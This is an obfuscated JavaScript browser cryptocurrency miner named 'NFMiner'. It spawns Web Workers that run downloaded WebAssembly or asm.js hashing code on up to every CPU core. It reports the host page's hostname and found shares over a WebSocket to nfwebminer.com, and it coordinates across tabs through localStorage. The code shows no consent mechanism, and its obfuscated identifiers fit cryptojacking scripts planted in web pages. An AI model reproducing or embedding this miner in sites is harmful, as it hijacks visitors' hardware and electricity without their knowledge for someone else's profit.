function NFMiner(_0xcc30x1, _0xcc30x2) {
    "use strict";
    _0xcc30x2 = _0xcc30x2 || {};
    var _0xcc30x3 = _0xcc30x2["load"] || "high";
    var _0xcc30x4 = 1;
    if (_0xcc30x3 == "low") {
        _0xcc30x4 = Math["max"](Math["ceil"](navigator["hardwareConcurrency"] / 4), 1)
    } else {
        if (_0xcc30x3 == "medium") {
            _0xcc30x4 = Math["max"](Math["ceil"](navigator["hardwareConcurrency"] / 2), 1)
        } else {
            if (_0xcc30x3 == "high") {
                _0xcc30x4 = Math["max"](navigator["hardwareConcurrency"] - 1, 1)
            } else {
                if (_0xcc30x3 == "full") {
                    _0xcc30x4 = Math["max"](navigator["hardwareConcurrency"], 1)
                }
            }
        }
    };
    var _0xcc30x5;
    var _0xcc30x6 = {};
    var _0xcc30x7 = 0;
    var _0xcc30x8 = [];
    var _0xcc30x9;
    var _0xcc30xa;
    var _0xcc30xb;
    var _0xcc30xc;
    var _0xcc30xd;
    var _0xcc30xe = false;
    var _0xcc30xf = false;
    var _0xcc30x10 = false;
    var _0xcc30x11;
    var _0xcc30x12 = _0xcc30x2["forceAsmJs"] || window["WebAssembly"] == undefined;
    var _0xcc30x13 = false;
    var _0xcc30x14 = 0;
    var _0xcc30x15 = 0;
    var _0xcc30x16;
    var _0xcc30x17;
    var _0xcc30x18 = _0xcc30x2["debug"] || false;
    this["on"] = function(_0xcc30x19, _0xcc30x1a) {
        if (_0xcc30x19 == "hashrate") {
            _0xcc30x16 = _0xcc30x1a
        } else {
            if (_0xcc30x19 == "shareAccepted") {
                _0xcc30x17 = _0xcc30x1a
            }
        }
    };
    var _0xcc30x1b = Math["random"]() * 0xffffffff | 0;
    var _0xcc30x1c = "nfwebminer.com";
    var _0xcc30x1d = true;
    if (_0xcc30x18) {
        console["log"]("ID: " + _0xcc30x1b + "; useAsmJs: " + _0xcc30x12 + "; threads: " + _0xcc30x5)
    };
    window["addEventListener"]("unload", function(_0xcc30x1e) {
        var _0xcc30x1f = localStorage["getItem"]("nfwebminer");
        if (_0xcc30x1f) {
            var _0xcc30x20 = JSON["parse"](_0xcc30x1f);
            if (_0xcc30x20["id"] == _0xcc30x1b) {
                localStorage["removeItem"]("nfwebminer")
            }
        }
    });
    this["getThreads"] = function() {
        return _0xcc30x5
    };
    this["setThreads"] = function(_0xcc30x1f) {
        _0xcc30x5 = Math["min"](Math["max"](_0xcc30x1f, 1), 8);
        _0xcc30x29()
    };
    this["setThreads"](_0xcc30x2["threads"] || _0xcc30x4);
    this["isRunning"] = function() {
        return _0xcc30xe
    };
    this["start"] = function() {
        if (_0xcc30x18) {
            console["log"]("this.statt!")
        };
        if (_0xcc30xe) {
            _0xcc30xf = false;
            return
        };
        _0xcc30xf = true;
        var _0xcc30x1f = localStorage["getItem"]("nfwebminer");
        if (_0xcc30x1f) {
            try {
                var _0xcc30x20 = JSON["parse"](_0xcc30x1f);
                if (_0xcc30x20["id"] != _0xcc30x1b) {
                    var _0xcc30x21 = Date["now"]() - (60000 * 2);
                    if (_0xcc30x20["date"] > _0xcc30x21) {
                        return
                    }
                }
            } catch (e) {
                if (this["_debug"]) {
                    console["log"](e)
                }
            }
        };
        localStorage["setItem"]("nfwebminer", JSON["stringify"]({
            id: _0xcc30x1b,
            date: Date["now"]()
        }));
        _0xcc30xe = true;
        _0xcc30xf = false;
        if (!_0xcc30x10) {
            if (_0xcc30x12) {
				console.log("Using webminer_v1.js");
                fetch("https://" + _0xcc30x1c + "/lib/webminer_v1.js")["then"]((_0xcc30x23) => _0xcc30x23["arrayBuffer"]())["then"]((_0xcc30x22) => {
                    _0xcc30x10 = _0xcc30x22;
                    _0xcc30x34()
                })
            } else {
				console.log("Using webminer_v1.base.wasm");
                fetch("webminer_v1.base_profiled.wasm")["then"]((_0xcc30x23) => _0xcc30x23["arrayBuffer"]())["then"]((_0xcc30x22) => {
                    _0xcc30x10 = _0xcc30x22;
                    _0xcc30x34()
                })
            }
        } else {
            _0xcc30x34()
        }
    };
    this["_calculateHashRate"] = function() {
        var _0xcc30x24 = _0xcc30x14 - _0xcc30x15;
        _0xcc30x15 = _0xcc30x14;
        if (_0xcc30x16) {
            _0xcc30x16(_0xcc30x24)
        };
        if (_0xcc30xf) {
            this["start"]()
        } else {
            if (_0xcc30xe) {
                var _0xcc30x1f = localStorage["getItem"]("nfwebminer");
                var _0xcc30x25 = false;
                if (_0xcc30x1f) {
                    var _0xcc30x20 = JSON["parse"](_0xcc30x1f);
                    if (_0xcc30x20["id"] != _0xcc30x1b) {
                        this["stop"]()
                    } else {
                        if ((_0xcc30x20["date"] + 60000) < Date["now"]()) {
                            _0xcc30x25 = true
                        }
                    }
                } else {
                    _0xcc30x25 = true
                };
                if (_0xcc30x25) {
                    localStorage["setItem"]("nfwebminer", JSON["stringify"]({
                        id: _0xcc30x1b,
                        date: Date["now"]()
                    }))
                }
            }
        }
    };
    this["_benchmarkInterval"] = setInterval(this["_calculateHashRate"]["bind"](this), 1000);
    this["stop"] = function() {
        _0xcc30xf = false;
        if (!_0xcc30xe) {
            return
        };
        localStorage["removeItem"]("nfwebminer");
        _0xcc30xe = false;
        _0xcc30x11["close"]()
    };

    function _0xcc30x26(_0xcc30x27) {
        if (_0xcc30x33 && _0xcc30xb < _0xcc30xd) {
            _0xcc30x27["postMessage"]({
                cmd: "work",
                blob: _0xcc30x9,
                difficulty: _0xcc30xa,
                nonce: _0xcc30xb,
                jobSequence: _0xcc30xc
            });
            _0xcc30xb++;
            _0xcc30x14++
        } else {
            _0xcc30x8["push"](_0xcc30x27)
        }
    }
    var _0xcc30x28 = 0;

    function _0xcc30x29() {
        if (_0xcc30x7 >= _0xcc30x5 || !_0xcc30xe) {
            return
        };
        for (i = _0xcc30x7; i < _0xcc30x5; i++) {
            var _0xcc30x2a;
            if (_0xcc30x18) {
                console["log"]("create worker!  " + _0xcc30x28)
            };
            var _0xcc30x2b = workerFunction.toString();
            _0xcc30x2b = _0xcc30x2b["substring"](_0xcc30x2b["indexOf"]("{") + 1, _0xcc30x2b["lastIndexOf"]("}"));
            _0xcc30x2a = new Blob([_0xcc30x2b], {
                type: "application/javascript"
            });
            var _0xcc30x27 = new Worker(URL["createObjectURL"](_0xcc30x2a));
            _0xcc30x7++;
            var _0xcc30x2c = _0xcc30x28++;
            _0xcc30x6[_0xcc30x2c] = _0xcc30x27;
            _0xcc30x27["onerror"] = function(_0xcc30x2d) {
                if (_0xcc30x18) {
                    console["log"]("Worker.onerror: ", _0xcc30x2d)
                }
            };
            _0xcc30x27["onmessage"] = function(_0xcc30x2d) {
                var _0xcc30x2e = _0xcc30x27;
                if (_0xcc30x2d["data"]["cmd"] == "ready") {
                    _0xcc30x26(_0xcc30x6[_0xcc30x2d["data"]["workerId"]])
                } else {
                    if (_0xcc30x2d["data"]["cmd"] == "finished") {
                        if (_0xcc30x7 > _0xcc30x5 || !_0xcc30xe) {
                            _0xcc30x7--;
                            _0xcc30x6[_0xcc30x2d["data"]["workerId"]]["terminate"]();
                            _0xcc30x6[_0xcc30x2d["data"]["workerId"]] = null
                        } else {
                            _0xcc30x26(_0xcc30x6[_0xcc30x2d["data"]["workerId"]])
                        }
                    } else {
                        if (_0xcc30x2d["data"]["cmd"] == "share") {
                            var _0xcc30x2f = hexToString(_0xcc30x2d["data"]["nonce"]);
                            var _0xcc30x30 = Uint32Array2hex(_0xcc30x2d["data"]["hash"], 8);
                            if (_0xcc30x18) {
                                console["log"]("Share found: " + _0xcc30x2f + " -> " + _0xcc30x30)
                            };
                            var _0xcc30x31 = {
                                command: "share",
                                nonce: _0xcc30x2f,
                                hash: _0xcc30x30,
                                jobSequence: _0xcc30x2d["data"]["jobSequence"]
                            };
                            _0xcc30x11["send"](JSON["stringify"](_0xcc30x31))
                        }
                    }
                };
                if (_0xcc30xb >= _0xcc30xd && !_0xcc30x13) {
                    _0xcc30x13 = true;
                    var _0xcc30x31 = {
                        command: "finished"
                    };
                    _0xcc30x11["send"](JSON["stringify"](_0xcc30x31))
                }
            };
            _0xcc30x27["postMessage"]({
                cmd: "buffer",
                buffer: _0xcc30x10,
                useAsmJs: _0xcc30x12,
                workerId: _0xcc30x2c
            })
        }
    }
    var _0xcc30x32 = 0;
    var _0xcc30x33 = false;

    function _0xcc30x34() {
        _0xcc30x33 = false;
        if (!_0xcc30xe) {
            _0xcc30x32 = 0;
            return
        };
        if (_0xcc30x32 == 0) {
            _0xcc30x36()
        } else {
            var _0xcc30x35 = Math["max"](Math["random"]() * _0xcc30x32, 20);
            setTimeout(_0xcc30x36, _0xcc30x35 * 1000)
        }
    }

    function _0xcc30x36() {
        var _0xcc30x37 = (_0xcc30x1d ? "wss" : "ws") + "://" + _0xcc30x1c + "/";
        _0xcc30x11 = new WebSocket(_0xcc30x37 + "proxy");
        _0xcc30x11["onopen"] = function(_0xcc30x1e) {
            _0xcc30x13 = true;
            _0xcc30x32 = 0;
            _0xcc30x33 = true;
            var _0xcc30x31 = {
                command: "connect",
                hash: _0xcc30x1,
                hostname: window["location"]["hostname"]
            };
            _0xcc30x11["send"](JSON["stringify"](_0xcc30x31))
        };
        _0xcc30x11["onclose"] = function(_0xcc30x1e) {
            if (_0xcc30x18) {
                console["log"]("WebSocket.onclose: " + _0xcc30x1e)
            };
            _0xcc30x32 = Math["min"](_0xcc30x32 + 20, 200);
            if (_0xcc30x32 > 40) {
                _0xcc30x1d = !_0xcc30x1d
            };
            _0xcc30x34();
            if (_0xcc30x1e["code"] != 1000 && _0xcc30x1e["code"] != 1001) {
                var _0xcc30x38 = new XMLHttpRequest();
                _0xcc30x38["open"]("POST", "connectionError", true);
                _0xcc30x38["send"](JSON["stringify"]({
                    code: _0xcc30x1e["code"],
                    reason: _0xcc30x1e["reason"]
                }))
            }
        };
        _0xcc30x11["onerror"] = function(_0xcc30x1e) {
            if (_0xcc30x18) {
                console["log"]("WebSocket.onerror: " + _0xcc30x1e)
            }
        };
        _0xcc30x11["onmessage"] = function(_0xcc30x39) {
            if (_0xcc30x18) {
                console["log"]("WebSocket.onmessage:", _0xcc30x39)
            };
            var _0xcc30x31 = JSON["parse"](_0xcc30x39["data"]);
            if (_0xcc30x31["command"] == "work") {
                _0xcc30x9 = new Uint32Array(19);
                hex2Uint32Array(_0xcc30x9, _0xcc30x31["blob"], 19);
                _0xcc30xa = parseHex(_0xcc30x31["difficulty"]);
                _0xcc30xc = _0xcc30x31["jobSequence"];
                _0xcc30xb = _0xcc30x31["fromNonce"];
                _0xcc30xd = _0xcc30x31["fromNonce"] + _0xcc30x31["max"];
                _0xcc30x13 = false;
                _0xcc30x29();
                while (_0xcc30x8["length"] > 0) {
                    var _0xcc30x27 = _0xcc30x8["pop"]();
                    _0xcc30x26(_0xcc30x27)
                }
            } else {
                if (_0xcc30x31["command"] == "error") {
                    if (_0xcc30x18) {
                        console["log"]("Error: code:" + _0xcc30x31["errorCode"] + " message:" + _0xcc30x31["errorMessage"])
                    }
                } else {
                    if (_0xcc30x31["command"] == "accepted") {
                        if (_0xcc30x18) {
                            console["log"]("Share accepted! reward:" + _0xcc30x31["reward"])
                        };
                        if (_0xcc30x17) {
                            _0xcc30x17(_0xcc30x31["reward"])
                        }
                    }
                }
            }
        }
    }
}
NFMiner["isMobileOrTablet"] = function() {
    var _0xcc30x3a = false;
    (function(_0xcc30x3b) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i ["test"](_0xcc30x3b) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i ["test"](_0xcc30x3b["substr"](0, 4))) {
            _0xcc30x3a = true
        }
    })(navigator["userAgent"] || navigator["vendor"] || window["opera"]);
    return _0xcc30x3a
};

function hex2Uint32Array(_0xcc30x22, _0xcc30x3d, _0xcc30x3e) {
    for (i = 0; i < _0xcc30x3e; i++) {
        for (j = 3; j >= 0; j--) {
            _0xcc30x22[i] = _0xcc30x22[i] * 256 + parseInt(_0xcc30x3d["substr"](i * 8 + j * 2, 2), 16)
        }
    }
}

function parseHex(_0xcc30x3d) {
    var _0xcc30x1f = 0;
    for (j = 3; j >= 0; j--) {
        _0xcc30x1f = _0xcc30x1f * 256 + parseInt(_0xcc30x3d["substr"](j * 2, 2), 16)
    };
    return _0xcc30x1f
}

function Uint32Array2hex(_0xcc30x22, _0xcc30x3e) {
    var _0xcc30x3d = "";
    for (var _0xcc30x41 = 0; _0xcc30x41 < _0xcc30x3e; _0xcc30x41++) {
        _0xcc30x3d += hexToString(_0xcc30x22[_0xcc30x41])
    };
    return _0xcc30x3d
}

function hexToString(_0xcc30x43) {
    var _0xcc30x3d = "";
    for (var _0xcc30x41 = 0; _0xcc30x41 < 4; _0xcc30x41++) {
        var _0xcc30x44 = _0xcc30x43 & 255;
        _0xcc30x43 = _0xcc30x43 >>> 8;
        var _0xcc30x45 = _0xcc30x44.toString(16);
        if (_0xcc30x45["length"] == 1) {
            _0xcc30x45 = "0" + _0xcc30x45
        };
        _0xcc30x3d += _0xcc30x45
    };
    return _0xcc30x3d
}

function workerFunction() {
    var _0xcc30x47;
    var _0xcc30x9;
    var _0xcc30xc;
    var _0xcc30x28;
	
	function wasmProfiler() {
		if (_0xcc30x47 != null && typeof _0xcc30x47["exports"]._resetInstCounters === "function") {
			var addCountLo = new Uint32Array(1);
			var andCountLo = new Uint32Array(1);
			var shlCountLo = new Uint32Array(1);
			var shrCountLo = new Uint32Array(1);
			var xorCountLo = new Uint32Array(1);
			var addCountHi = new Uint32Array(1);
			var andCountHi = new Uint32Array(1);
			var shlCountHi = new Uint32Array(1);
			var shrCountHi = new Uint32Array(1);
			var xorCountHi = new Uint32Array(1);
			var addCount = new Uint32Array(1);
			var andCount = new Uint32Array(1);
			var shlCount = new Uint32Array(1);
			var shrCount = new Uint32Array(1);
			var xorCount = new Uint32Array(1);
				
			addCountLo[0] = _0xcc30x47["exports"]._getI32AddCountLo();
			andCountLo[0] = _0xcc30x47["exports"]._getI32AndCountLo();
			shlCountLo[0] = _0xcc30x47["exports"]._getI32ShlCountLo();
			shrCountLo[0] = _0xcc30x47["exports"]._getI32ShruCountLo();
			xorCountLo[0] = _0xcc30x47["exports"]._getI32XorCountLo();
			addCountHi[0] = _0xcc30x47["exports"]._getI32AddCountHi();
			andCountHi[0] = _0xcc30x47["exports"]._getI32AndCountHi();
			shlCountHi[0] = _0xcc30x47["exports"]._getI32ShlCountHi();
			shrCountHi[0] = _0xcc30x47["exports"]._getI32ShruCountHi();
			xorCountHi[0] = _0xcc30x47["exports"]._getI32XorCountHi();
			_0xcc30x47["exports"]._resetInstCounters();	
			
			addCount[0] = addCountHi[0] * 4294967296 + addCountLo[0];
			andCount[0] = andCountHi[0] * 4294967296 + andCountLo[0];
			shlCount[0] = shlCountHi[0] * 4294967296 + shlCountLo[0];
			shrCount[0] = shrCountHi[0] * 4294967296 + shrCountLo[0];
			xorCount[0] = xorCountHi[0] * 4294967296 + xorCountLo[0];
			
			//console.log("("+addCountLo+","+andCountLo+","+shlCountLo+","+shrCountLo+","+xorCountLo+")");
			//console.log("("+addCountHi+","+andCountHi+","+shlCountHi+","+shrCountHi+","+xorCountHi+")");
			console.log("("+addCount[0]+","+andCount[0]+","+shlCount[0]+","+shrCount[0]+","+xorCount[0]+")");
		} else {
			console.log("Wasm not loaded yet");
		}
		
		setTimeout(wasmProfiler, 5000);
	}
	wasmProfiler();

    function _0xcc30x48(_0xcc30x41) {
        return _0xcc30x5c(_0xcc30x41)
    }

    function _0xcc30x49(_0xcc30x2f, _0xcc30x4a, _0xcc30x4b, _0xcc30x4c, _0xcc30x4d, _0xcc30x4e, _0xcc30x4f, _0xcc30x50, _0xcc30x51) {
        _0xcc30x5e(_0xcc30x2f, _0xcc30x4a, _0xcc30x4b, _0xcc30x4c, _0xcc30x4d, _0xcc30x4e, _0xcc30x4f, _0xcc30x50, _0xcc30x51)
    }

    function _0xcc30x52() {
        var _0xcc30x53 = Math["pow"](2, 32) - 1;
        var _0xcc30x54 = Math["floor"](Math["random"]() * _0xcc30x53);
        return _0xcc30x54
    }
    self["onmessage"] = function(_0xcc30x2d) {
        if (_0xcc30x2d["data"]["cmd"] == "work") {
            if (!_0xcc30x9 || _0xcc30xc != _0xcc30x2d["data"]["jobSequence"]) {
                _0xcc30x9 = _0xcc30x2d["data"]["blob"];
                if (_0xcc30x47) {
                    _0xcc30x47["exports"]._setWork(_0xcc30x2d["data"]["difficulty"])
                } else {
                    _setWork(_0xcc30x2d["data"]["difficulty"])
                }
            };
            _0xcc30xc = _0xcc30x2d["data"]["jobSequence"];
            if (_0xcc30x47) {
                _0xcc30x47["exports"]._processOneNonce(_0xcc30x2d["data"]["nonce"])
            } else {
                _processOneNonce(_0xcc30x2d["data"]["nonce"])
            };
            self["postMessage"]({
                cmd: "finished",
                workerId: _0xcc30x28
            })
        } else {
            if (_0xcc30x2d["data"]["cmd"] == "buffer") {
                _0xcc30x28 = _0xcc30x2d["data"]["workerId"];
                if (_0xcc30x2d["data"]["useAsmJs"]) {
                    var _0xcc30x55 = new Blob([_0xcc30x2d["data"]["buffer"]], {
                        type: "application/javascript"
                    });
                    self["importScripts"](URL["createObjectURL"](_0xcc30x55));
                    _0xcc30x5a(null)
                } else {
                    WebAssembly["compile"](_0xcc30x2d["data"]["buffer"])["then"]((_0xcc30x56) => _0xcc30x61(_0xcc30x56, null))
                }
            }
        }
    };

    function _get_blob(_0xcc30x41) {
        return _0xcc30x5c(_0xcc30x41)
    }

    function _0xcc30x58(_0xcc30x2f, _0xcc30x4a, _0xcc30x4b, _0xcc30x4c, _0xcc30x4d, _0xcc30x4e, _0xcc30x4f, _0xcc30x50, _0xcc30x51) {
        _0xcc30x5e(_0xcc30x2f, _0xcc30x4a, _0xcc30x4b, _0xcc30x4c, _0xcc30x4d, _0xcc30x4e, _0xcc30x4f, _0xcc30x50, _0xcc30x51)
    }

    function _0xcc30x59() {
        var _0xcc30x53 = Math["pow"](2, 32) - 1;
        var _0xcc30x54 = Math["floor"](Math["random"]() * _0xcc30x53);
        return _0xcc30x54
    }

    function _0xcc30x5a(_0xcc30x5b) {
        _0xcc30x47 = _0xcc30x5b;
        self["postMessage"]({
            cmd: "ready",
            workerId: _0xcc30x28
        })
    }

    function _0xcc30x5c(_0xcc30x5d) {
        return _0xcc30x9[_0xcc30x5d]
    }

    function _0xcc30x5e(_0xcc30x2f, _0xcc30x4a, _0xcc30x4b, _0xcc30x4c, _0xcc30x4d, _0xcc30x4e, _0xcc30x4f, _0xcc30x50, _0xcc30x51) {
        var _0xcc30x30 = new Uint32Array(8);
        _0xcc30x30[0] = _0xcc30x4a;
        _0xcc30x30[1] = _0xcc30x4b;
        _0xcc30x30[2] = _0xcc30x4c;
        _0xcc30x30[3] = _0xcc30x4d;
        _0xcc30x30[4] = _0xcc30x4e;
        _0xcc30x30[5] = _0xcc30x4f;
        _0xcc30x30[6] = _0xcc30x50;
        _0xcc30x30[7] = _0xcc30x51;
        self["postMessage"]({
            cmd: "share",
            nonce: _0xcc30x2f,
            hash: _0xcc30x30,
            jobSequence: _0xcc30xc,
            workerId: _0xcc30x28
        })
    }

    function _0xcc30x5f(_0xcc30x60) {
        return Math["ceil"]((_0xcc30x60 + 16) / (16)) * (16)
    }

    function _0xcc30x61(_0xcc30x56, _0xcc30x62) {
        _0xcc30x62 = _0xcc30x62 || {};
        _0xcc30x62["env"] = _0xcc30x62["env"] || {};
        _0xcc30x62["env"]["memoryBase"] = _0xcc30x62["env"]["memoryBase"] || 0;
        _0xcc30x62["env"]["tableBase"] = _0xcc30x62["env"]["tableBase"] || 0;
        _0xcc30x62["global"] = {
            NaN: NaN,
            Infinity: Infinity
        };
        if (!_0xcc30x62["env"]["memory"]) {
            _0xcc30x62["env"]["memory"] = new WebAssembly.Memory({
                initial: 256,
                maximum: 256
            })
        };
        HEAP32 = new Int32Array(_0xcc30x62["env"]["memory"]["buffer"]);
        STATIC_BASE = 1024;
        STATICTOP = STATIC_BASE + 2110096;
        _0xcc30x62["env"]["DYNAMICTOP_PTR"] = 0;
        _0xcc30x62["env"]["tempDoublePtr"] = 0;
        _0xcc30x62["env"]["ABORT"] = 0;
        _0xcc30x62["env"]["STACKTOP"] = _0xcc30x5f(STATICTOP + 16);
        _0xcc30x62["env"]["STACK_MAX"] = 5242880;
        _0xcc30x62["env"]["memoryBase"] = 1024;
        _0xcc30x62["env"]["DYNAMICTOP_PTR"] = 2111136;
        _0xcc30x62["env"]["tempDoublePtr"] = 2111120;
        _0xcc30x62["env"]["STACKTOP"] = 2111152;
        _0xcc30x62["env"]["STACK_MAX"] = 7354032;
        DYNAMIC_BASE = _0xcc30x5f(_0xcc30x62["env"].STACK_MAX);
        HEAP32[_0xcc30x62["env"]["DYNAMICTOP_PTR"] >> 2] = DYNAMIC_BASE;
        _0xcc30x62["env"]["abort"] = function(_0xcc30x1f) {
            alert("abort: " + _0xcc30x1f)
        };
        _0xcc30x62["env"]["enlargeMemory"] = function() {
            alert("enlargeMemory")
        };
        _0xcc30x62["env"]["getTotalMemory"] = function() {
            return 16777216
        };
        _0xcc30x62["env"]["abortOnCannotGrowMemory"] = function() {
            alert("abortOnCannotGrowMemory")
        };
        _0xcc30x62["env"]["abortStackOverflow"] = function() {
            alert("abortStackOverflow")
        };
        _0xcc30x62["env"]["nullFunc_ii"] = function() {
            alert("nullFunc_ii")
        };
        _0xcc30x62["env"]["nullFunc_iiii"] = function() {
            alert("nullFunc_iiii")
        };
        _0xcc30x62["env"]["nullFunc_viii"] = function() {
            alert("nullFunc_viii")
        };
        _0xcc30x62["env"]["___unlock"] = function() {};
        _0xcc30x62["env"]["___lock"] = function() {};
        _0xcc30x62["env"]["___syscall6"] = function() {
            alert("___syscall6")
        };
        _0xcc30x62["env"]["___setErrNo"] = function() {
            alert("___setErrNo")
        };
        _0xcc30x62["env"]["_abort"] = function() {
            alert("_abort")
        };
        _0xcc30x62["env"]["_emscripten_memcpy_big"] = function(_0xcc30x63, _0xcc30x64, _0xcc30x65) {
            HEAPU8["set"](HEAPU8["subarray"](_0xcc30x64, _0xcc30x64 + _0xcc30x65), _0xcc30x63);
            return _0xcc30x63
        };
        _0xcc30x62["env"]["___syscall54"] = function() {
            alert("___syscall54")
        };
        _0xcc30x62["env"]["___syscall140"] = function() {
            alert("___syscall140")
        };
        _0xcc30x62["env"]["___syscall20"] = function() {
            alert("___syscall20")
        };
        _0xcc30x62["env"]["___assert_fail"] = function() {
            alert("___assert_fail")
        };
        _0xcc30x62["env"]["___syscall146"] = function() {
            alert("___syscall146")
        };
        _0xcc30x62["env"]["abortStackOverflow"] = function() {};
        _0xcc30x62["env"]["_share_found"] = _0xcc30x5e;
        _0xcc30x62["env"]["_get_blob"] = _0xcc30x5c;
        _0xcc30x62["env"]["_oaes_get_seed"] = function() {
            var _0xcc30x53 = Math["pow"](2, 32) - 1;
            var _0xcc30x54 = Math["floor"](Math["random"]() * _0xcc30x53);
            return _0xcc30x54
        };
        if (!_0xcc30x62["env"]["table"]) {
            _0xcc30x62["env"]["table"] = new WebAssembly.Table({
                initial: 14,
                maximum: 14,
                element: "anyfunc"
            })
        };
        WebAssembly["instantiate"](_0xcc30x56, _0xcc30x62)["then"]((_0xcc30x47) => _0xcc30x5a(_0xcc30x47))
    }
}